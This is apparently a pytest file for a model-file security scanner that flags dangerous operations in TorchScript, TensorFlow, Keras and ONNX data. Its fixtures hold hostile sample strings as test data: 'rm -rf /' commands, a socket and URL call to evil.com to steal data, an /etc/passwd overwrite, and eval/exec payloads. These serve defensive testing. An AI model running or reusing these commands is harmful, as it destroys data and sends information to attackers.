"""Tests for JIT/Script code execution detection."""

from modelaudit.jit_script_detector import JITScriptDetector, detect_jit_script_risks


class TestJITScriptDetector:
    """Test the JITScriptDetector class."""

    def test_detect_dangerous_torch_ops(self):
        """Test detection of dangerous TorchScript operations."""
        detector = JITScriptDetector()

        # Create fake TorchScript data with dangerous operations
        data = b"""
        TorchScript-1.0
        def forward(self, x):
            torch.ops.aten.system("rm -rf /")
            torch.ops.aten.exec("malicious code")
            return x
        """

        findings = detector.scan_torchscript(data, "test_model.pt")
        assert len(findings) >= 2
        assert any("torch.ops.aten.system" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert any("torch.ops.aten.exec" in getattr(f, "pattern", getattr(f, "operation", "")) for f in findings)
        assert all(
            getattr(f, "severity", getattr(f, "severity", "")) == "CRITICAL"
            for f in findings
            if hasattr(f, "pattern") or "operation" in f
        )

    def test_detect_torch_jit_compilation(self):
        """Test detection of TorchScript JIT compilation."""
        detector = JITScriptDetector({"strict_mode": True})

        # Create data with JIT markers
        data = b"""
        torch.jit.script
        @torch.jit.compile
        def model_func():
            pass
        """

        findings = detector.scan_torchscript(data, "jit_model.pt")
        assert any(f.type == "jit_usage" for f in findings)

    def test_detect_embedded_pickle_in_torch(self):
        """Test detection of embedded pickle in TorchScript."""
        detector = JITScriptDetector()

        # Simulate TorchScript with pickle opcodes
        data = b"TorchScript\x00GLOBAL torch.nn Module\x00"

        findings = detector.scan_torchscript(data)
        assert any(f.type == "embedded_pickle" for f in findings)
        assert any("pickle" in f.message.lower() for f in findings)

    def test_detect_dangerous_tf_ops(self):
        """Test detection of dangerous TensorFlow operations."""
        detector = JITScriptDetector()

        # Create fake TensorFlow SavedModel data
        data = b"""
        saved_model.pb
        tf.py_func(lambda x: exec('malicious'), [input])
        tf.numpy_function(dangerous_func, [x], tf.float32)
        """

        findings = detector.scan_tensorflow(data, "model.pb")
        assert len(findings) >= 2
        assert any("tf.py_func" in f.operation for f in findings)
        assert any("tf.numpy_function" in f.operation for f in findings)

    def test_detect_keras_lambda_layers(self):
        """Test detection of Keras Lambda layers."""
        detector = JITScriptDetector()

        # Create data with Keras Lambda layer
        data = b"""
        tensorflow.keras.layers.Lambda
        lambda x: eval(x)
        """

        findings = detector.scan_tensorflow(data)
        assert any(f.type == "lambda_layer" for f in findings)
        assert any("Lambda" in f.message for f in findings)

    def test_detect_onnx_custom_operators(self):
        """Test detection of ONNX custom operators."""
        detector = JITScriptDetector()

        # Create fake ONNX data with custom operators
        data = b"""
        ai.onnx.contrib.custom_op
        PythonOp: eval_code
        """

        findings = detector.scan_onnx(data, "model.onnx")
        assert any(f.type == "custom_operator" for f in findings)
        assert any(f.type == "python_operator" for f in findings)

    def test_detect_dangerous_imports_in_code(self):
        """Test detection of dangerous imports in embedded code."""
        detector = JITScriptDetector()

        # Create data with embedded Python code containing dangerous imports
        data = b"""
        def malicious_function():
            import os
            import subprocess
            os.system('evil command')
            subprocess.call(['rm', '-rf', '/'])
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("os" in getattr(f, "import_", "") for f in findings)
        assert any("subprocess" in getattr(f, "import_", "") for f in findings)
        assert any(f.severity == "CRITICAL" for f in findings)

    def test_detect_dangerous_builtins(self):
        """Test detection of dangerous builtins like eval, exec."""
        detector = JITScriptDetector()

        data = b"""
        def process_input(x):
            result = eval(x)
            exec(compile(x, 'string', 'exec'))
            return __import__('os').system(result)
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("eval" in getattr(f, "builtin", "") for f in findings)
        assert any("exec" in getattr(f, "builtin", "") for f in findings)
        assert any("__import__" in getattr(f, "builtin", "") for f in findings)

    def test_detect_code_execution_patterns(self):
        """Test detection of code execution patterns in binary data."""
        detector = JITScriptDetector()

        # Create data with various execution patterns
        data = b"""
        subprocess.run(['malicious', 'command'])
        os.system('rm -rf /')
        socket.create_connection(('evil.com', 1337))
        urllib.request.urlopen('http://evil.com/steal')
        open('/etc/passwd', 'w').write('hacked')
        """

        findings = detector._extract_and_check_python_code(data, "Test", "test.model")
        assert any("subprocess" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("os command" in getattr(f, "pattern", "").lower() for f in findings)
        assert any("socket" in getattr(f, "pattern", "").lower() for f in findings)

    def test_auto_detect_model_type(self):
        """Test automatic model type detection."""
        detector = JITScriptDetector()

        # Test PyTorch detection
        pytorch_data = b"TorchScript model data"
        findings = detector.scan_model(pytorch_data, "unknown")
        # Should attempt TorchScript scanning

        # Test TensorFlow detection
        tf_data = b"saved_model.pb tensorflow data"
        findings = detector.scan_model(tf_data, "unknown")
        # Should attempt TensorFlow scanning

        # Test ONNX detection
        onnx_data = b"ai.onnx model data"
        findings = detector.scan_model(onnx_data, "unknown")
        # Should attempt ONNX scanning

    def test_strict_mode(self):
        """Test strict mode flags any JIT usage."""
        detector_normal = JITScriptDetector({"strict_mode": False})
        detector_strict = JITScriptDetector({"strict_mode": True})

        data = b"TorchScript torch.jit.script"

        findings_normal = detector_normal.scan_torchscript(data)
        findings_strict = detector_strict.scan_torchscript(data)

        # Strict mode should flag JIT usage
        assert any(f.type == "jit_usage" for f in findings_strict)
        # Normal mode might not flag it as severely
        strict_warnings = [f for f in findings_strict if f.type == "jit_usage"]
        assert len(strict_warnings) > 0

    def test_custom_dangerous_ops(self):
        """Test adding custom dangerous operations."""
        config = {
            "custom_dangerous_ops": {
                "torch": ["my.custom.dangerous.op"],
                "tf": ["tf.my.dangerous.function"],
            }
        }
        detector = JITScriptDetector(config)

        # Test custom Torch op
        torch_data = b"my.custom.dangerous.op(payload)"
        findings = detector.scan_torchscript(torch_data)
        assert any("my.custom.dangerous.op" in getattr(f, "operation", "") for f in findings)

        # Test custom TF op
        tf_data = b"tf.my.dangerous.function(exploit)"
        findings = detector.scan_tensorflow(tf_data)
        assert any("tf.my.dangerous.function" in getattr(f, "operation", "") for f in findings)

    def test_ast_analysis(self):
        """Test Python AST analysis for dangerous patterns."""
        detector = JITScriptDetector()

        # Valid Python code with dangerous patterns
        python_code = b"""
def malicious():
    import os
    from subprocess import call

    eval('dangerous')
    exec(compile('code', 'string', 'exec'))
    __import__('sys').exit()
"""

        findings = detector._extract_and_check_python_code(python_code, "Test", "test")

        # Should detect through AST analysis
        ast_findings = [f for f in findings if "ast_" in getattr(f, "type", "")]
        assert len(ast_findings) > 0
        assert any("os" in getattr(f, "import_", "") for f in ast_findings)


class TestDetectJITScriptRisks:
    """Test the convenience function for file scanning."""

    def test_scan_file(self, tmp_path):
        """Test scanning a file for JIT/Script risks."""
        # Create a test file with dangerous content
        test_file = tmp_path / "model.pt"
        test_file.write_bytes(b"TorchScript\ntorch.ops.aten.system('evil')")

        findings = detect_jit_script_risks(str(test_file))
        assert len(findings) > 0
        assert any("torch.ops.aten.system" in str(f) for f in findings)

    def test_file_not_found(self):
        """Test handling of non-existent files."""
        findings = detect_jit_script_risks("/non/existent/file.pt")
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "not found" in findings[0].message

    def test_file_too_large(self, tmp_path):
        """Test handling of files that are too large."""
        large_file = tmp_path / "large.pt"
        large_file.write_bytes(b"x" * 100)

        # Test with very small max_size
        findings = detect_jit_script_risks(str(large_file), max_size=50)
        assert len(findings) == 1
        assert findings[0].type == "error"
        assert "too large" in findings[0].message

    def test_model_type_detection_from_extension(self, tmp_path):
        """Test that model type is detected from file extension."""
        # Test PyTorch extensions
        for ext in [".pt", ".pth", ".pts", ".torchscript"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"torch.ops.aten.exec('bad')")
            findings = detect_jit_script_risks(str(test_file))
            assert any("torch.ops.aten.exec" in str(f) for f in findings)

        # Test TensorFlow extensions
        for ext in [".pb", ".h5", ".keras"]:
            test_file = tmp_path / f"model{ext}"
            test_file.write_bytes(b"tf.py_func(evil)")
            findings = detect_jit_script_risks(str(test_file))
            assert any("tf.py_func" in str(f) for f in findings)

        # Test ONNX extension
        test_file = tmp_path / "model.onnx"
        test_file.write_bytes(b"PythonOp custom")
        findings = detect_jit_script_risks(str(test_file))
        assert any("Python operator" in str(f) for f in findings)
